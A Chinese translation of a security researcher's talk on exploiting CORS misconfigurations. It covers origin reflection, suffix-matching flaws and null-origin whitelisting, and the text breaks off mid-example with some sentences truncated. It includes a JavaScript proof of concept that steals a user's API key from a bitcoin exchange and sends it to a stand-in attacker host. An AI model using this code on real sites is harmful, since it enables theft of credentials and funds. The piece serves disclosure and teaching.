原文：
本文内容摘自我在AppSec
USA大会上发表的演讲，准确来说，这里已经做了极大的简化。如果您有时间（或在阅读本文是遇到难以理解的内容）的话，我强烈建议您查看相应的[幻灯片](https://portswigger.net/knowledgebase/papers/exploitingcorsmisconfigurations.pdf
"幻灯片")和[视频](https://www.youtube.com/watch?v=wgkj4ZgxI4c&list=PLpr-xdpM8wG8RHOguwOZhUHkKiDeWpvFp&index=31 "视频")。
跨源资源共享（[CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS
"CORS")）是一种放宽同源策略要求的机制，以使不同的网站可以通过浏览器进行通信。通常来说，人们普遍认为某些CORS配置是非常危险的，但具体到这些配置的细微差别及其含义，却很少有人能够正确理解。在这篇文章中，我将为读者展示如何从黑客的角度来批判性地检查CORS配置的漏洞，并利用它们来窃取比特币。
**黑客之于CORS**
* * *
网站可以通过发送以下HTTP响应头部来启用CORS：
    Access-Control-Allow-Origin: https://example.com
这样的话，就允许访问指定的源（域，这里为“
"同源策略")来说，通常是不允许的。在默认情况下，发送跨域请求时不会携带cookie或其他凭据，因此，它不能用于窃取与用户相关的敏感信息（如CSRF令牌）。不过，网站服务器也可以使用以下头部来启用凭据传输：
    Access-Control-Allow-Credentials：true
这样就能建立起信任关系：如果example.com上存在[XSS](https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected "XSS")漏洞的话，对该网站来说，可能会带来巨大的危害。
**大隐隐于市**
* * *
如您所见，实现对单个域的信任是非常容易的事情。不过，如果需要信任多个域的话，那该怎么办呢？根据相关规范的建议，只需列出相关的域，并用空格加以分隔即可，例如：
**Access-Control-Allow-Origin：http：//foo.com**
* * *
但是，没有哪个浏览器真正支持这一特性。
当然，读者可能还希望使用通配符来信任所有子域，具体方法是：
    Access-Control-Allow-Origin: *.portswigger.net
    But that won't work either. The only wildcard origin is '*'
实际上，CORS自身也提供了一个隐蔽的安全措施。如果您想完全禁用SOP，并通过下面的头部组合将自己的网站暴露给所有人：
    Access-Control-Allow-Origin: *
    Access-Control-Allow-Credentials: true
这时，将在浏览器控制台中收到以下错误消息：
    “当凭证标志为true时，无法在Access-Control-Allow-Origin中使用通配符。”
规范中提到了这个异常，并且Mozilla的文档也提供了相应的[说明](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Requests_with_credentials "说明")：
    “在响应凭证请求时，服务器必须指定域，并且不能使用通配符”
换句话说，使用通配符可以有效地禁用Allow-Credentials头部。
由于存在这些限制，所以，许多服务器都是以编程的方式根据用户提供的Origin头部值来生成“Access-Control-Allow-Origin”头部的。如果您发现了带有“Access-Control-*”头部却未声明相关域的HTTP响应的话，则强烈表明，该服务器是根据您的输入来生成头部的。而其他服务器只有收到包含Origin头部的请求后，才会发送CORS头部，这使得相关的漏洞非常容易被遗漏。
**凭证与比特币**
* * *
因此，许多网站都是从用户输入中获得允许跨源访问的域名的。那么，这会不会导致安全隐患呢？于是，我决定评估一些漏洞赏金网站并从中寻找答案。请注意，虽然这些网站都提供了漏洞赏金计划，但是，前面提到的漏洞还是被许多赏金猎人所遗漏了。
我很快就复现了[Evan Johnson](http://ejj.io/misconfigured-cors/ "Evan
Johnson")的发现，即许多应用程序在做出响应之前，并没有对源进行检查，同时，我还找到了一个易受攻击的比特币交易所（遗憾的是，该交易所不愿意公开其名称）：
    GET /api/requestApiKey HTTP/1.1
    Host: 
    Origin: https://fiddle.jshell.net
    Cookie: sessionid=... 
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://fiddle.jshell.net
    Access-Control-Allow-Credentials: true 
    {"[private API key]"}
与此同时，我还建立了一POC代码，用于证明窃取用户的私有API密钥是一件多么轻而易举的事情：
    var req = new XMLHttpRequest(); 
    req.onload = reqListener; 
    req.open('get','https://btc-exchange/api/requestApiKey',true); 
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='//atttacker.net/log?key='+this.responseText; 
    };
在获取用户的API密钥后，我可以禁用帐户的通知功能，启用2FA以将其锁定，并将其比特币转移到任意地址。由此看来，头部配置错误是一种非常严重的安全漏洞。当然，我还是克制住了将比特币收入囊中并跑路的冲动，并向该交易所提交了该漏洞，之后，他们仅用了20分钟就修复了该漏洞。
此外，对于一些网站来说，当对源进行验证以确定是否应该信任它时，常常会遇到经典的URL解析错误。例如，有一个网站，不妨称之为advisor.com，完全信任以advisor.com结尾的所有域名，包括“definitelynotadvisor.com”。更糟糕的是，第二个比特币交易所（我们称之为btc.net）信任所有以“
**当Origin的值为null**
* * *
如果您对上面的内容非常关注的话，很可能想知道什么情况下[Origin的值为null](https://www.w3.org/TR/cors/#access-control-allow-origin-response-header
"Origin的值为null")。按照相关规范的说法，重定向会触发这种情况，此外，根据stackoverflow上的某些帖子来看，本地HTML文件也可能导致这种情况。也许是由于这种情况与本地文件有关，我发现有不少网站将其列入了白名单，包括Google的PDF阅读器：
    GET /reader?url=zxcvbn.pdf
    Host: docs.google.com
    Origin: null
    HTTP/1.1 200 OK